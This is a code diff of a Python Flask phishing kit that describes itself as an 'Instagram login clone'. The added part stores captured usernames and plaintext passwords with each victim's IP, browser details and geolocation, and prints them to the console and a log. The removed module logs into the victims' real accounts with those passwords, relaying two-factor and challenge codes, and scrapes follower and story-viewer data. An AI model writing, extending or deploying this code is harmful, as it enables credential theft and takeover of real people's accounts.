@@ -1,467 +1,508 @@
-"""Instagram private-API engine for Insight Capture.
+"""
+Insight Capture — Instagram login clone + real account analysis.
 
-One worker thread per browser session. The session blob is persisted so the
-device fingerprint survives restarts, which is what keeps challenges rare.
+Env:
+  SECRET_KEY         flask session key            (unset = generated + persisted in DATA_DIR)
+  ADMIN_TOKEN        console password             (unset = open, dev only)
+  DATA_DIR           sqlite + log directory       (default ./data)
+  GEO                1 to enable IP geo lookup    (default off)
+  GEO_TIMEOUT        geo lookup timeout, seconds  (default 1.2)
+  GEO_TTL            geo cache TTL, seconds       (default 3600)
+  ANSI               0 to strip log colours       (default: on)
+  PORT               listen port                  (default 5000)
+  TRUST_PROXY        trusted proxy hops           (default 1, 0 = direct)
+  CLIENT_IP_HEADER   e.g. CF-Connecting-IP        (default: ProxyFix / remote_addr)
+  COOKIE_SECURE      1/0                          (default: on when RENDER is set)
+  LOGIN_WAIT         seconds to wait for verdict  (default 20)
+  IG_PROXY           residential proxy            (optional, recommended)
+  IG_MAX_PEOPLE      follower/following cap       (default 3000)
 """
 from __future__ import annotations
 
+import csv
+import hmac
+import io
+import ipaddress
 import json
+import logging
 import os
+import secrets
+import sqlite3
+import sys
 import threading
 import time
-import traceback
+import unicodedata
+import urllib.request
+import uuid
+from collections import OrderedDict, deque
+from datetime import datetime, timezone
+from logging.handlers import RotatingFileHandler
 from pathlib import Path
+from urllib.parse import urlencode
 
-from instagrapi import Client
-from instagrapi import exceptions as igexc
-from instagrapi.exceptions import (
-    AccountSuspended,
-    BadCredentials,
-    BadPassword,
-    ChallengeRequired,
-    ClientError,
-    ClientLoginRequired,
-    LoginRequired,
-    ProxyAddressIsBlocked,
-    TwoFactorRequired,
-    UserNotFound,
+from flask import (
+    Flask,
+    Response,
+    abort,
+    g,
+    jsonify,
+    redirect,
+    request,
+    session,
+    url_for,
 )
+from markupsafe import escape
+from werkzeug.middleware.proxy_fix import ProxyFix
 
-WAIT_ERRORS = tuple(
-    getattr(igexc, n)
-    for n in ("PleaseWaitFewMinutes", "RateLimitError", "ClientThrottledError")
-    if hasattr(igexc, n)
-)
+import ig
 
+# ============================== config ==============================
+ADMIN_TOKEN = os.environ.get("ADMIN_TOKEN", "")
 DATA_DIR = Path(os.environ.get("DATA_DIR", "data"))
-IG_DIR = DATA_DIR / "ig"
-PROXY = os.environ.get("IG_PROXY", "").strip()
-MAX_PEOPLE = int(os.environ.get("IG_MAX_PEOPLE", "3000") or 3000)
-ENGAGE_POSTS = int(os.environ.get("IG_ENGAGE_POSTS", "6") or 6)
-CODE_TIMEOUT = int(os.environ.get("IG_CODE_TIMEOUT", "600") or 600)
+GEO_ENABLED = os.environ.get("GEO", "0") == "1"
+GEO_TIMEOUT = float(os.environ.get("GEO_TIMEOUT", "1.2"))
+GEO_TTL = int(os.environ.get("GEO_TTL", "3600"))
+GEO_FAIL_TTL = int(os.environ.get("GEO_FAIL_TTL", "120"))
+TRUST_PROXY = int(os.environ.get("TRUST_PROXY", "1") or 0)
+CLIENT_IP_HEADER = os.environ.get("CLIENT_IP_HEADER", "").strip()
+COOKIE_MAX_AGE = 60 * 60 * 24 * 365
+LOGIN_WAIT = float(os.environ.get("LOGIN_WAIT", "20"))
+SYNC_MIN_INTERVAL = int(os.environ.get("SYNC_MIN_INTERVAL", "90") or 90)
 
-_jobs: dict[str, "Job"] = {}
-_jobs_lock = threading.Lock()
+_ansi_env = os.environ.get("ANSI")
+ANSI_ON = (_ansi_env != "0") if _ansi_env is not None else True
 
-# wired by app.py
-on_state = None   # fn(cid, fields: dict)
-on_log = None     # fn(text: str, level: str)
-
-BAD_PASSWORD = "Sorry, your password was incorrect. Please double-check your password."
-BAD_USER = ("The username you entered doesn't belong to an account. "
-            "Please check your username and try again.")
-RATE = "Please wait a few minutes before you try again."
-SUSPENDED = "Your account has been disabled."
-PROXY_BLOCKED = "Instagram blocked this server IP. Set IG_PROXY to a residential proxy."
-GENERIC = "Something went wrong. Please try again."
+DATA_DIR.mkdir(parents=True, exist_ok=True)
+DB_PATH = DATA_DIR / "insight.sqlite3"
+JSONL_PATH = DATA_DIR / "events.jsonl"
 
 
-def _notify(cid: str, **fields) -> None:
-    if on_state:
+def _load_secret() -> str:
+    env = os.environ.get("SECRET_KEY")
+    if env:
+        return env
+    path = DATA_DIR / "secret.key"
+    try:
+        if path.exists():
+            existing = path.read_text(encoding="utf-8").strip()
+            if len(existing) >= 32:
+                return existing
+    except OSError:
+        pass
+    generated = secrets.token_hex(32)
+    try:
+        path.write_text(generated + "\n", encoding="utf-8")
+        os.chmod(path, 0o600)
+    except OSError:
+        pass
+    return generated
+
+
+app = Flask(__name__)
+app.secret_key = _load_secret()
+if TRUST_PROXY > 0:
+    app.wsgi_app = ProxyFix(app.wsgi_app, x_for=TRUST_PROXY, x_proto=TRUST_PROXY, x_host=TRUST_PROXY)
+app.config.update(
+    SESSION_COOKIE_NAME="insight_session",
+    SESSION_COOKIE_SAMESITE="Lax",
+    SESSION_COOKIE_HTTPONLY=True,
+    SESSION_COOKIE_SECURE=(
+        os.environ.get("COOKIE_SECURE", "1" if os.environ.get("RENDER") else "0") != "0"
+    ),
+    PERMANENT_SESSION_LIFETIME=COOKIE_MAX_AGE,
+    MAX_CONTENT_LENGTH=512 * 1024,
+    JSON_SORT_KEYS=False,
+)
+
+# ============================== logging ==============================
+logger = logging.getLogger("insight")
+logger.setLevel(os.environ.get("LOG_LEVEL", "INFO"))
+logger.propagate = False
+_fmt = logging.Formatter("%(asctime)s %(levelname)-5s %(message)s")
+
+if not logger.handlers:
+    _sh = logging.StreamHandler(sys.stdout)
+    _sh.setFormatter(_fmt)
+    logger.addHandler(_sh)
+
+    _fh = RotatingFileHandler(DATA_DIR / "insight.log", maxBytes=1_000_000, backupCount=3)
+    _fh.setFormatter(_fmt)
+    logger.addHandler(_fh)
+
+_jsonl_lock = threading.Lock()
+
+C = {
+    "reset": "\033[0m",
+    "cred": "\033[1;33m",
+    "cred_val": "\033[1;97m",
+    "uval": "\033[1;96m",
+    "pval": "\033[1;95m",
+    "ctx": "\033[2;36m",
+    "meta": "\033[1;35m",
+    "ok": "\033[1;32m",
+    "bad": "\033[1;31m",
+}
+BOX_W = 64
+_ZERO_W = "\u200d\ufe0f"
+
+
+def paint(text: str, color: str) -> str:
+    return f"{C.get(color, '')}{text}{C['reset']}" if ANSI_ON else text
+
+
+def _char_w(ch: str) -> int:
+    if ch in _ZERO_W or unicodedata.combining(ch):
+        return 0
+    return 2 if unicodedata.east_asian_width(ch) in ("W", "F") else 1
+
+
+def fit(text: str, width: int) -> str:
+    out: list[str] = []
+    used = 0
+    for ch in str(text):
+        cw = _char_w(ch)
+        if used + cw > width:
+            break
+        out.append(ch)
+        used += cw
+    return "".join(out) + " " * (width - used)
+
+
+def print_box(title: str, lines: list, color: str = "cred", value_color: str = "cred_val") -> None:
+    inner = BOX_W - 2
+    rows = [paint("╔" + "═" * BOX_W + "╗", color),
+            paint("║ ", color) + paint(fit(title, inner), color) + paint(" ║", color),
+            paint("╠" + "═" * BOX_W + "╣", color)]
+
+    for line in lines:
+        text, vc = line if isinstance(line, tuple) else (line, value_color)
+        rows.append(paint("║ ", color) + paint(fit(text, inner), vc) + paint(" ║", color))
+
+    rows.append(paint("╚" + "═" * BOX_W + "╝", color))
+    sys.stdout.write("\n" + "\n".join(rows) + "\n")
+    sys.stdout.flush()
+
+
+def emit(payload: dict, boxes: list[tuple] | None = None) -> None:
+    for box in boxes or []:
+        print_box(box[0], box[1], box[2] if len(box) > 2 else "cred",
+                  box[3] if len(box) > 3 else "cred_val")
+
+    stamp = iso_now()
+    body = {"ts": stamp, "kind": "CREDENTIAL", **payload}
+
+    lines = [f"── CREDENTIAL ── {stamp}"]
+    for k, v in payload.items():
+        if isinstance(v, dict):
+            for sk, sv in v.items():
+                lines.append(f"   {sk}: {str(sv)[:200]}")
+        else:
+            lines.append(f"   {k}: {str(v)[:400]}")
+    logger.info("\n".join(lines))
+
+    try:
+        with _jsonl_lock, JSONL_PATH.open("a", encoding="utf-8") as fh:
+            fh.write(json.dumps(body, ensure_ascii=False) + "\n")
+    except OSError:
+        pass
+
+
+# ============================== time ==============================
+def iso_now() -> str:
+    return datetime.now(timezone.utc).isoformat(timespec="seconds")
+
+
+def iso_ago(seconds: int) -> str:
+    return datetime.fromtimestamp(time.time() - seconds, timezone.utc).isoformat(timespec="seconds")
+
+
+# ============================== storage ==============================
+_db_lock = threading.Lock()
+
+SCHEMA = """
+CREATE TABLE IF NOT EXISTS creds (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    cid TEXT, sid TEXT, source TEXT, username TEXT, password TEXT,
+    ip TEXT, ua TEXT, referer TEXT, accept_lang TEXT,
+    meta_json TEXT, country TEXT, city TEXT, isp TEXT, geo_json TEXT,
+    verdict TEXT DEFAULT '', created_at TEXT
+);
+CREATE INDEX IF NOT EXISTS idx_creds_id ON creds(id DESC);
+CREATE INDEX IF NOT EXISTS idx_creds_pair ON creds(cid, username, password);
+CREATE INDEX IF NOT EXISTS idx_creds_time ON creds(created_at);
+
+CREATE TABLE IF NOT EXISTS ig_state (
+    cid TEXT PRIMARY KEY,
+    username TEXT,
+    phase TEXT DEFAULT 'idle',
+    error TEXT DEFAULT '',
+    notice TEXT DEFAULT '',
+    profile_json TEXT,
+    counts_json TEXT,
+    lists_json TEXT,
+    synced_at INTEGER DEFAULT 0,
+    created_at TEXT
+);
+CREATE TABLE IF NOT EXISTS ig_actions (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    cid TEXT, kind TEXT, target TEXT, ok INTEGER, detail TEXT, created_at TEXT
+);
+"""
+
+INSERT_SQL = """INSERT INTO creds
+    (cid, sid, source, username, password, ip, ua, referer,
+     accept_lang, meta_json, country, city, isp, geo_json, created_at)
+    VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)"""
+
+
+def connect() -> sqlite3.Connection:
+    conn = sqlite3.connect(DB_PATH, timeout=15, check_same_thread=False)
+    conn.row_factory = sqlite3.Row
+    conn.execute("PRAGMA journal_mode=WAL")
+    conn.execute("PRAGMA synchronous=NORMAL")
+    conn.execute("PRAGMA busy_timeout=15000")
+    return conn
+
+
+def _with_retry(fn, attempts: int = 5):
+    delay = 0.05
+    for attempt in range(attempts):
         try:
-            on_state(cid, fields)
-        except Exception:
-            pass
+            return fn()
+        except sqlite3.OperationalError as exc:
+            msg = str(exc).lower()
+            if ("locked" not in msg and "busy" not in msg) or attempt == attempts - 1:
+                raise
+            time.sleep(delay)
+            delay = min(delay * 2, 0.8)
 
 
-def _log(text: str, level: str = "info") -> None:
-    if on_log:
+def init_db() -> None:
+    with _db_lock:
+        conn = connect()
         try:
-            on_log(text, level)
-        except Exception:
-            pass
+            conn.executescript(SCHEMA)
+            conn.commit()
+        finally:
+            conn.close()
 
 
-def _person(u) -> dict:
+def recent_cred_id(cid: str, username: str, password: str, seconds: int = 8) -> int | None:
+    conn = connect()
+    try:
+        row = conn.execute(
+            "SELECT id FROM creds WHERE cid=? AND username=? AND password=? AND created_at>=? "
+            "ORDER BY id DESC LIMIT 1",
+            (cid, username, password, iso_ago(seconds)),
+        ).fetchone()
+        return int(row["id"]) if row else None
+    finally:
+        conn.close()
+
+
+def set_verdict(cred_id: int, verdict: str) -> None:
+    conn = connect()
+    try:
+        conn.execute("UPDATE creds SET verdict=? WHERE id=?", (verdict[:24], cred_id))
+        conn.commit()
+    finally:
+        conn.close()
+
+
+# ---------------- instagram state ----------------
+def save_state(cid: str, fields: dict) -> None:
+    cols: dict[str, object] = {}
+    if "phase" in fields:
+        cols["phase"] = fields.get("phase")
+    if "error" in fields:
+        cols["error"] = (fields.get("error") or "")[:400]
+    if "notice" in fields:
+        cols["notice"] = (fields.get("notice") or "")[:200]
+    payload = fields.get("payload")
+    if payload:
+        cols["profile_json"] = json.dumps(payload.get("profile") or {}, ensure_ascii=False)
+        cols["counts_json"] = json.dumps(payload.get("counts") or {}, ensure_ascii=False)
+        cols["lists_json"] = json.dumps(payload.get("lists") or {}, ensure_ascii=False)
+        cols["synced_at"] = int(payload.get("synced_at") or 0)
+
+    conn = connect()
+    try:
+        conn.execute("INSERT OR IGNORE INTO ig_state (cid, username, created_at) VALUES (?,?,?)",
+                     (cid, "", iso_now()))
+        if cols:
+            sets = ", ".join(f"{k}=?" for k in cols)
+            conn.execute(f"UPDATE ig_state SET {sets} WHERE cid=?", (*cols.values(), cid))
+        conn.commit()
+    finally:
+        conn.close()
+
+
+def load_state(cid: str) -> dict:
+    conn = connect()
+    try:
+        row = conn.execute("SELECT * FROM ig_state WHERE cid=?", (cid,)).fetchone()
+    finally:
+        conn.close()
+    if not row:
+        return {}
     return {
-        "pk": str(getattr(u, "pk", "") or ""),
-        "username": (getattr(u, "username", "") or "")[:60],
-        "full_name": (getattr(u, "full_name", "") or "")[:80],
-        "pic": str(getattr(u, "profile_pic_url", "") or ""),
-        "verified": bool(getattr(u, "is_verified", False)),
+        "phase": row["phase"] or "idle",
+        "error": row["error"] or "",
+        "notice": row["notice"] or "",
+        "synced_at": row["synced_at"] or 0,
+        "profile": json.loads(row["profile_json"] or "{}"),
+        "counts": json.loads(row["counts_json"] or "{}"),
+        "lists": json.loads(row["lists_json"] or "{}"),
     }
 
 
-class Job:
-    def __init__(self, cid: str, username: str, password: str):
-        self.cid = cid
-        self.username = username
-        self.password = password
-        self.phase = "queued"
-        self.error = ""
-        self.notice = ""
-        self.choice = ""
-        self.cl: Client | None = None
-        self.uid = ""
-        self.started = time.time()
-        self._cv = threading.Condition()
-        self._verdict = ""
-        self._code: str | None = None
-        self._lock = threading.Lock()
-        self._syncing = False
-        self._thread: threading.Thread | None = None
-        self._data: dict = {}
-
-    # ---------- state ----------
-    def _push(self, **extra) -> None:
-        payload = {"phase": self.phase, "error": self.error,
-                   "notice": self.notice, "choice": self.choice}
-        payload.update(extra)
-        _notify(self.cid, **payload)
-
-    def _set_verdict(self, value: str) -> None:
-        with self._cv:
-            if not self._verdict:
-                self._verdict = value
-            self._cv.notify_all()
-
-    def wait_verdict(self, timeout: float) -> str:
-        with self._cv:
-            self._cv.wait_for(lambda: bool(self._verdict), timeout)
-            return self._verdict
-
-    @property
-    def verdict(self) -> str:
-        return self._verdict
-
-    @property
-    def alive(self) -> bool:
-        return bool(self._thread and self._thread.is_alive())
-
-    def _session_file(self) -> Path:
-        IG_DIR.mkdir(parents=True, exist_ok=True)
-        safe = "".join(c for c in self.username.lower() if c.isalnum() or c in "._-")[:48]
-        return IG_DIR / f"{safe or 'user'}-{self.cid}.json"
-
-    # ---------- code handoff ----------
-    def submit_code(self, code: str) -> None:
-        with self._cv:
-            self._code = (code or "").strip()
-            self._cv.notify_all()
-
-    def _wait_code(self, timeout: int = CODE_TIMEOUT) -> str:
-        with self._cv:
-            self._cv.wait_for(lambda: self._code is not None, timeout)
-            code = self._code
-            self._code = None
-            return code or ""
-
-    def _handler(self, username: str, choice) -> str:
-        self.choice = getattr(choice, "name", str(choice))
-        self.phase = "code"
-        self._push()
-        self._set_verdict("code")
-        _log(f"challenge for {username} via {self.choice} — waiting for code")
-        code = self._wait_code()
-        self.phase = "login"
-        self._push()
-        return code
-
-    # ---------- lifecycle ----------
-    def start(self) -> None:
-        if self.alive:
-            return
-        self._thread = threading.Thread(target=self.run, daemon=True)
-        self._thread.start()
-
-    def run(self) -> None:
-        try:
-            cl = Client()
-            cl.delay_range = [1, 3]
-            if PROXY:
-                cl.set_proxy(PROXY)
-            sf = self._session_file()
-            if sf.exists():
-                try:
-                    cl.load_settings(sf)
-                except Exception:
-                    pass
-            cl.challenge_code_handler = self._handler
-            self.cl = cl
-            self.phase = "login"
-            self._push()
-            self._login(cl)
-            self.uid = str(cl.user_id or "")
-            try:
-                cl.dump_settings(sf)
-                os.chmod(sf, 0o600)
-            except OSError:
-                pass
-            self.phase = "ready"
-            self.error = ""
-            self._push()
-            self._set_verdict("ok")
-            _log(f"instagram login ok: {self.username}")
-            self.sync(full=True)
-        except (BadPassword, BadCredentials):
-            self._fail("bad_password", BAD_PASSWORD)
-        except UserNotFound:
-            self._fail("bad_user", BAD_USER)
-        except AccountSuspended:
-            self._fail("suspended", SUSPENDED)
-        except ProxyAddressIsBlocked:
-            self._fail("proxy", PROXY_BLOCKED)
-        except TwoFactorRequired:
-            self._fail("code", "Enter the two-factor code Instagram sent you.")
-        except ChallengeRequired as exc:
-            self._fail("challenge", f"Manual verification required: {exc}"[:300])
-        except Exception as exc:
-            if WAIT_ERRORS and isinstance(exc, WAIT_ERRORS):
-                self._fail("rate", RATE)
-            elif isinstance(exc, (LoginRequired, ClientLoginRequired)):
-                self._fail("session", "Instagram ended the session. Try again.")
-            else:
-                self._fail("error", GENERIC)
-                _log(traceback.format_exc()[-1200:], "error")
-
-    def _fail(self, verdict: str, msg: str) -> None:
-        self.phase = "error"
-        self.error = msg
-        self._push()
-        self._set_verdict(verdict)
-        _log(f"instagram fail ({self.username}): {verdict} — {msg}", "error")
-
-    def _call_login(self, cl: Client, code: str = ""):
-        if code:
-            try:
-                return cl.login(self.username, self.password, verification_code=code)
-            except TypeError:
-                return cl.two_factor_login(code)
-        return cl.login(self.username, self.password)
-
-    def _login(self, cl: Client) -> None:
-        for _ in range(3):
-            try:
-                self._call_login(cl)
-                return
-            except TwoFactorRequired:
-                self.choice = "2FA"
-                self.phase = "code"
-                self._push()
-                self._set_verdict("code")
-                code = self._wait_code()
-                self.phase = "login"
-                self._push()
-                if not code:
-                    raise
-                self._call_login(cl, code)
-                return
-            except ChallengeRequired:
-                self._set_verdict("challenge")
-                last = dict(getattr(cl, "last_json", None) or {})
-                if last.get("challenge"):
-                    try:
-                        if cl.challenge_resolve(last):
-                            self._call_login(cl)
-                            return
-                    except ChallengeRequired:
-                        pass
-                self.notice = "Approve the login in the Instagram app, then press Continue."
-                self.phase = "approve"
-                self._push()
-                self._wait_code(900)
-                self.phase = "login"
-                self.notice = ""
-                self._push()
-                self._call_login(cl)
-                return
-        raise ChallengeRequired("challenge")
-
-    # ---------- data ----------
-    def _fetch(self) -> dict:
-        cl = self.cl
-        uid = str(cl.user_id)
-        me = cl.user_info(uid)
-
-        followers = {str(k): _person(v) for k, v in cl.user_followers(uid, amount=MAX_PEOPLE).items()}
-        following = {str(k): _person(v) for k, v in cl.user_following(uid, amount=MAX_PEOPLE).items()}
-
-        engaged: set[str] = set()
-        likes: dict[str, list] = {}
-        try:
-            medias = cl.user_medias(uid, amount=ENGAGE_POSTS)
-        except Exception:
-            medias = []
-        for m in medias:
-            try:
-                likers = [str(u.pk) for u in cl.media_likers(m.pk, amount=400)]
-            except Exception:
-                likers = []
-            likes[str(m.pk)] = likers
-            engaged.update(likers)
-            try:
-                for c in cl.media_comments(m.pk, amount=200):
-                    engaged.add(str(c.user.pk))
-            except Exception:
-                pass
-
-        viewers: dict[str, int] = {}
-        try:
-            for st in cl.user_stories(uid)[:5]:
-                try:
-                    for v in cl.story_viewers(st.pk, amount=600):
-                        pk = str(v.pk)
-                        viewers[pk] = viewers.get(pk, 0) + 1
-                except Exception:
-                    pass
-        except Exception:
-            pass
-
-        return {
-            "profile": {
-                "username": me.username or self.username,
-                "full_name": me.full_name or "",
-                "bio": me.biography or "",
-                "pic": str(me.profile_pic_url or ""),
-                "followers": int(me.follower_count or 0),
-                "following": int(me.following_count or 0),
-                "media": int(me.media_count or 0),
-                "verified": bool(me.is_verified),
-            },
-            "followers": followers,
-            "following": following,
-            "engaged": sorted(engaged),
-            "likes": likes,
-            "viewers": viewers,
-        }
-
-    def sync(self, full: bool = False) -> dict:
-        with self._lock:
-            if self._syncing or not self.cl:
-                return self._data
-            self._syncing = True
-        try:
-            if self.phase == "ready":
-                self.phase = "sync"
-                self._push()
-            data = self._fetch()
-            prev = self._data or {}
-            events = list(prev.get("events") or [])
-            now = int(time.time())
-
-            if prev.get("followers") is not None:
-                pf, nf = set(prev["followers"]), set(data["followers"])
-                for pk in list(pf - nf)[:80]:
-                    events.insert(0, {"kind": "unfollow", "ts": now,
-                                      "text": f"{prev['followers'][pk]['username']} unfollowed you"})
-                for pk in list(nf - pf)[:80]:
-                    events.insert(0, {"kind": "follow", "ts": now,
-                                      "text": f"{data['followers'][pk]['username']} started following you"})
-                for mid, old in (prev.get("likes") or {}).items():
-                    for pk in list(set(old) - set(data["likes"].get(mid, [])))[:20]:
-                        u = prev["followers"].get(pk) or prev["following"].get(pk)
-                        if u:
-                            events.insert(0, {"kind": "like", "ts": now,
-                                              "text": f"{u['username']} removed a like"})
-
-            data["events"] = events[:250]
-            data["synced_at"] = now
-            self._data = data
-            self.phase = "ready"
-            self.error = ""
-            self._push(payload=self.public())
-            _log(f"sync ok for {self.username}: {len(data['followers'])} followers, "
-                 f"{len(data['following'])} following")
-            return data
-        except (LoginRequired, ClientLoginRequired):
-            self.notice = "Session expired — logging in again."
-            try:
-                self._login(self.cl)
-                self.phase = "ready"
-                self._push()
-            except Exception:
-                pass
-            return self._data
-        except Exception as exc:
-            self.phase = "ready"
-            self.notice = f"Sync failed: {type(exc).__name__}"
-            self._push()
-            _log(f"sync fail for {self.username}: {exc}", "error")
-            return self._data
-        finally:
-            self._syncing = False
-
-    def public(self) -> dict:
-        d = self._data or {}
-        followers = d.get("followers") or {}
-        following = d.get("following") or {}
-        engaged = set(d.get("engaged") or [])
-        viewers = d.get("viewers") or {}
-
-        notback = [following[p] for p in following if p not in followers]
-        fans = [followers[p] for p in followers if p not in following]
-        mutual = [p for p in followers if p in following]
-        ghosts = [followers[p] for p in followers if p not in engaged and p not in following]
-
-        stalkers = []
-        for pk, n in sorted(viewers.items(), key=lambda kv: -kv[1])[:60]:
-            u = followers.get(pk) or following.get(pk)
-            if u:
-                stalkers.append({**u, "views": n})
-
-        return {
-            "phase": self.phase,
-            "error": self.error,
-            "notice": self.notice,
-            "choice": self.choice,
-            "synced_at": d.get("synced_at"),
-            "profile": d.get("profile") or {"username": self.username},
-            "counts": {
-                "followers": len(followers),
-                "following": len(following),
-                "notback": len(notback),
-                "ghosts": len(ghosts),
-                "stalkers": len(stalkers),
-                "mutual": len(mutual),
-            },
-            "lists": {
-                "notback": notback[:400],
-                "fans": fans[:200],
-                "ghosts": ghosts[:300],
-                "stalkers": stalkers,
-                "activity": (d.get("events") or [])[:150],
-            },
-        }
-
-    # ---------- actions ----------
-    def unfollow(self, pk: str, username: str) -> tuple[bool, str]:
-        if not self.cl or self.phase != "ready":
-            return False, "Not logged in"
-        try:
-            ok = self.cl.user_unfollow(pk)
-        except Exception as exc:
-            return False, type(exc).__name__
-        if ok:
-            self._data.setdefault("following", {}).pop(str(pk), None)
-            self._data.setdefault("events", []).insert(
-                0, {"kind": "unfollowed", "ts": int(time.time()),
-                    "text": f"You unfollowed {username}"})
-            self._push(payload=self.public())
-        return bool(ok), "" if ok else "Already unfollowed"
-
-    def follow(self, pk: str, username: str) -> tuple[bool, str]:
-        if not self.cl or self.phase != "ready":
-            return False, "Not logged in"
-        try:
-            ok = self.cl.user_follow(pk)
-        except Exception as exc:
-            return False, type(exc).__name__
-        return bool(ok), "" if ok else "Already following"
+def log_action(cid: str, kind: str, target: str, ok: bool, detail: str = "") -> None:
+    conn = connect()
+    try:
+        conn.execute(
+            "INSERT INTO ig_actions (cid, kind, target, ok, detail, created_at) VALUES (?,?,?,?,?,?)",
+            (cid, kind, target[:80], 1 if ok else 0, detail[:200], iso_now()),
+        )
+        conn.commit()
+    finally:
+        conn.close()
 
 
-def get(cid: str) -> Job | None:
-    with _jobs_lock:
-        return _jobs.get(cid)
+def _ig_log(text: str, level: str = "info") -> None:
+    getattr(logger, level if level in ("info", "warning", "error") else "info")(text)
+    if level == "error":
+        print_box("⚠ INSTAGRAM", [(text[:120], "cred_val")], "bad", "ctx")
 
 
-def start(cid: str, username: str, password: str) -> Job:
-    with _jobs_lock:
-        job = _jobs.get(cid)
-        if job and job.alive and job.username.lower() == username.lower():
-            if job.phase == "ready":
-                threading.Thread(target=job.sync, daemon=True).start()
-            return job
-        job = Job(cid, username, password)
-        _jobs[cid] = job
-    job.start()
-    return job
+ig.on_state = save_state
+ig.on_log = _ig_log
+
+
+# ============================== helpers ==============================
+_rate: dict[str, deque] = {}
+_rate_lock = threading.Lock()
+_geo_cache: "OrderedDict[str, tuple[float, dict]]" = OrderedDict()
+_geo_lock = threading.Lock()
+GEO_MAX = 2000
+
+
+def client_ip() -> str:
+    if CLIENT_IP_HEADER:
+        raw = request.headers.get(CLIENT_IP_HEADER, "")
+        if raw:
+            return raw.split(",")[0].strip() or "-"
+    return request.remote_addr or "-"
+
+
+def is_private(ip: str) -> bool:
+    if not ip or ip == "-":
+        return True
+    try:
+        addr = ipaddress.ip_address(ip.split("%")[0])
+    except ValueError:
+        return True
+    return (
+        addr.is_private or addr.is_loopback or addr.is_link_local
+        or addr.is_reserved or addr.is_multicast or addr.is_unspecified
+    )
+
+
+def rate_ok(key: str, limit: int, window: int = 60) -> bool:
+    now = time.time()
+    with _rate_lock:
+        dq = _rate.get(key)
+        if dq is None:
+            dq = _rate[key] = deque()
+        while dq and now - dq[0] > window:
+            dq.popleft()
+        if len(dq) >= limit:
+            return False
+        dq.append(now)
+        if len(_rate) > 20_000:
+            for dead in [k for k, v in _rate.items() if not v][:5000]:
+                _rate.pop(dead, None)
+        return True
+
+
+def _geo_lookup(ip: str) -> dict:
+    url = ("http://ip-api.com/json/" + ip +
+           "?fields=status,country,countryCode,regionName,city,isp,org,as,proxy,hosting")
+    try:
+        with urllib.request.urlopen(url, timeout=GEO_TIMEOUT) as resp:
+            data = json.loads(resp.read().decode("utf-8", "replace"))
+    except Exception:
+        return {}
+    return data if data.get("status") == "success" else {}
+
+
+def geo(ip: str) -> dict:
+    if not GEO_ENABLED or is_private(ip):
+        return {}
+    now = time.time()
+    with _geo_lock:
+        hit = _geo_cache.get(ip)
+        if hit and hit[0] > now:
+            _geo_cache.move_to_end(ip)
+            return hit[1]
+
+    data = _geo_lookup(ip)
+
+    with _geo_lock:
+        _geo_cache[ip] = (now + (GEO_TTL if data else GEO_FAIL_TTL), data)
+        _geo_cache.move_to_end(ip)
+        while len(_geo_cache) > GEO_MAX:
+            _geo_cache.popitem(last=False)
+    return data
+
+
+def make_initials(name: str) -> str:
+    parts = [p for p in name.replace("_", ".").replace("-", ".").replace(" ", ".").split(".") if p]
+    return ("".join(p[0] for p in parts[:2]) or name[:2] or "YO").upper()
+
+
+def cred_box(title: str, username: str, password: str) -> tuple:
+    return (title, [
+        ("username : " + (username or "(blank)"), "uval"),
+        ("password : " + (password or "(blank)"), "pval"),
+    ], "cred", "uval")
+
+
+def ctx_box(ip: str, source: str, ua: str, place: str) -> tuple:
+    return ("context", [
+        ("ip       : " + (ip or "-"), "ctx"),
+        ("source   : " + (source or "-"), "ctx"),
+        ("place    : " + (place or "-"), "ctx"),
+        ("ua       : " + (ua or "-")[:52], "ctx"),
+    ], "cred", "ctx")
+
+
+# ============================== auth / csrf ==============================
+def admin_ok() -> bool:
+    if not ADMIN_TOKEN:
+        return True
+    if session.get("admin"):
+        return True
+    tok = (request.args.get("token") or request.form.get("token")
+           or request.headers.get("X-Admin-Token", ""))
+    if tok and hmac.compare_digest(str(tok), ADMIN_TOKEN):
+        session["admin"] = True
+        return True
+    return False
+
+
+def csrf_token() -> str:
+    tok = session.get("_csrf")
+    if not tok:
+        tok = secrets.token_urlsafe(24)
+        session["_csrf"] = tok
+    return tok
+
+
+def csrf_ok() -> bool:
+    sent = request.form.get("_csrf") or request.args.get("_csrf") or ""
+    stored = session.get("_csrf") or ""
+    return bool(sent and stored and hmac.compare_digest(sent, stored))
+
+
+def html(body: str, status: int = 200) -> Response:
+    return Response(body, status=status, mimetype="text/html; charset=utf-8")
